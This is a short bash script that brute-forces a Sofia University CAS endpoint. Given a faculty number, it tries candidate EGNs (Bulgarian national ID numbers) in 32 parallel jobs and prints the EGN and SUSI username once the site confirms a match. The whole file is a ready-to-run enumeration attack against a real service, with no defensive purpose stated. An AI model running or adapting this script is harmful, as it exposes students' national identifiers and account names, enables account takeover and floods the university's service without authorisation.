#!/bin/bash

[ $# -eq 1 ] || { echo "Usage: $0 <fn>" >&2; exit 1; }

function try_one() {
	while :; do
		t="$2 $(curl -s -X POST -d "fn=$1&egn=$2" "https://cas.uni-sofia.bg/index.php" | \
			grep 'Потребителско име в СУСИ:')"
		[ $? -ne 0 ] || break
	done
	echo "$t" | grep -q "не е намерено" && exit 0
	echo "$t"
	exit 255
}
export -f try_one

res="$(xargs -I{} -P 32 -n 1 bash -c 'try_one "$@"' bash "$1" {} 2>/dev/null)"

username="$(echo "$res" | sed -E 's/.*име в СУСИ: ([^<]*)<.*/\1/')"
egn="$(echo "$res" | cut -c -10)"
[ "$username" ] && { echo "$1, $username -> $egn"; exit 0; }
echo "Not found!" >&2
exit 1
